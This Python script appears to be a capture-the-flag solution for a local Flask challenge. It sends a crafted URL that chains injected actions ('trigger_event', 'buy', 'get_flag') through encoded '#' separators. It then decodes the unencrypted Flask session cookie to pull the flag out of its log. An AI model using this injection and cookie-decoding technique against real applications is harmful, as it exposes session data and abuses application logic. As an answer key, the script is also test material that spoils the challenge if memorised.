#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/04/30, 15:07
"""

import sys
import zlib
import requests
from hashlib import *
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode


def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)
    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True
    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode')
    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress')
    return session_json_serializer.loads(payload)


def get():
    URL = 'http://127.0.0.1:8081'
    res = requests.get(
        URL+"/d5afe1f66147e857/?action:trigger_event%23;action:buy;7%23action:get_flag;")
    if res.status_code == 200:
        return res.headers
    return False


if __name__ == '__main__':
    headers = get()
    session = headers['Set-Cookie'].split('=')[1].split(';')[0]
    de = decryption(session)
    print([i for i in de['log'] if 'show_flag' in i][0][15:])
